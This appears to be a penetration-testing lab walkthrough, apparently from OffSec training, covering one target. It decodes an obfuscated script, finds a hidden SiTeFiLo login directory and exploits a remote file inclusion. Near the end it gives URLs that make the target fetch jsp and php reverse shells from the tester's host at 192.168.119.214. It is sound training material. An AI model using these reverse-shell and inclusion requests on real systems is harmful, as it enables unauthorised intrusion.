Attack Vector 14 - Bad Ph33r

Attack Vector 14 - Bad Ph33r

Explore more netcat... we get a bad request if we just do like this:
![a14da1f09b29d25e93561c1ecfd68574.png](../../../_resources/23781db6c8cb4d84a6d77c761e06bcec.png)

But we get the source code if if use User-Agent curl:
`printf "GET / HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![fd6d3293779ac40e49a76cb7102e34f2.png](../../../_resources/419ad0dedf89403ab379d77fc0b3bb95.png)

A bunch of pages redirect to test.asp. There is referene to a hidd3n-script...
![1b2147729316d451b6c99d3109b3782d.png](../../../_resources/c1620c2d83cb49ffa480b87caeaefcfa.png)

Aha! The hidd3n-script
`printf "GET /hidd3n-script HTTP/1.1\r\nHost: 10.11.1.133\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.133 80`
![a912fe5f9ef5835c3221fcd1eac28f00.png](../../../_resources/27bbbda44b434824bd5bae9d9238fcbb.png)

Decode the script! Used HexDecoder website. `http://ddecode.com/hexdecoder/?results=b9248126e067728365cc4725f8235294`
![a88064a784fd42b5da80b45ac13b74da.png](../../../_resources/ad7701128d924bdbae9b13963f833eec.png)


var _0x5490=["length"," ","offsecphun1.gif","offsecphun2.png","getSeconds","floor","<img src='","'>","write","offsecphun5.bmp","d6467e109c1606ed29","-","1f2e73705207bd","21213/"];var sillydate=0;var sillyvar=0;function StringArray(_0x5b7ex4) {this[_0x5490[0]]=_0x5b7ex4;for (var _0x5b7ex5=1;_0x5b7ex5 <= _0x5b7ex4;_0x5b7ex5++) {this[_0x5b7ex5]=_0x5490[1];};};image=new StringArray(10);image[0]=_0x5490[2];image[1]=_0x5490[3];image[2]=_0x5490[2];image[3]=_0x5490[3];image[4]=_0x5490[2];image[5]=_0x5490[3];image[6]=_0x5490[2];image[7]=_0x5490[3];image[8]=_0x5490[3];image[9]=_0x5490[3];var ran=60/image[_0x5490[0]];function _0x5491() {sillydate=new Date();sillyvar=sillydate[_0x5490[4]]();sillyvar=Math[_0x5490[5]](sillyvar/ran);return (image[sillyvar]);};function _0x5499(_0x4499) {var hmmmm=document.createElement("img");hmmmm.src="/"+_0x4499;document.body.appendChild(hmmmm);}//_0x5499(_0x5490[12]+_0x5490[10]+_0x5490[11]+_0x5490[13]+_0x5491());


What is this? An open UDP port 8696... error in pasting??
![f9b8ebb326b386d04606d7a6d4cac8a7.png](../../../_resources/8f96da53c4a947428562298d8dae1aea.png)

[Javascript code deobfuscator](http://codeamaze.com/code-beautifier/javascript-deobfuscator)
![d6e67eb25f79299d3fd1b9c0efe99b11.png](../../../_resources/83f4cd9f129d42d491c4f13078feccc9.png)
Here is the deobfuscated script **Problem! Using this strips the first array, so essetially this is unusable**
[unhidd3n-script.js](../../../_resources/dd4764d2de694d048e2e6c317bef54aa.js)


Manually, I replaced all the hex strings using this site [Hex to Ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

This link was helpful
[How to build software](https://www.howtobuildsoftware.com/index.php/how-do/bWBX/%E2%80%9C)

The hidd3n-script after I converted the hex manually:
[hidd3n-script](../../../_resources/f742aed1181445238b313979ce4490de.133hidd3)
![c7432d6b3f4142dfeea947f437f0e7f2.png](../../../_resources/3f1c6917f0c54c3fb2d1503b56960bc6.png)

Tried inputting the offsecphun5.bmp
this got redirected to
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg`
![baf5ab1461fbe4a1a2f32378f6618ec8.png](../../../_resources/cea7dbd479054f8082b4ee31d1b33a83.png)

But the directory shows a login page:
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/`
![ec6828a95c3a2c6f5e90eb54d17e4ac0.png](../../../_resources/a1b92b3eef8346c58091cab6e10ee6a6.png)

The source code for 
`view-source:http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/index.asp`
![0949b25419cfcf3b6614874bd3df4417.png](../../../_resources/d8239642f1d146a2aee491efb033c059.png)

# Search for slogin_POST_username and slogin_POST_password
## Google search for slogin_post_username:
[Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion](https://www.exploit-db.com/exploits/7444)

## Searchsploit had nothing for slogin
`searchsploit slogin`
![c44b430e89c35bca07cf779e60e3713d.png](../../../_resources/3e16d497144245f1aeeb4f64dfacd887.png)

`searcshploit sitefilo`
![80a9969f1336663627df41825dceb106.png](../../../_resources/7f161af95326474485dab2139fae9ed2.png)

### Does the file exist? I think so...
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php`
![6a03fb779025f7ea4143ff18bbfe3d75.png](../../../_resources/216d1d19e9624d5f8568a5fffb02f85b.png)

### The RFI exploit should be like this:
[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]

The slog_users.txt is there!
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slog_users.txt`
![3b8c9d60c01287d3859081c99a3f1b5e.png](../../../_resources/3ffd3379c8a74322ac93300240b338bd.png)

Tried a jsp reverse shell... didn't quite work.
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/jsp-reverse.jsp?`
![3a7c3b93808a5ee619abd24e63cb4121.png](../../../_resources/9771fc9d775d419f9b9120786c4e5915.png)

Looking at the above output... perhaps php is better. Using the reverse shell from /usr/share/wordlist
`http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.214/php-reverse-shell.php?`

![bc6190236deda6266c4beceac888daec.png](../../../_resources/6aa045518edb451b9eddf9a6bfeefc2f.png)

The listener
![6565b87e4699988db53ce2f718c5e4bf.png](../../../_resources/60a726c863c94e22b9987ead5f9754c7.png)


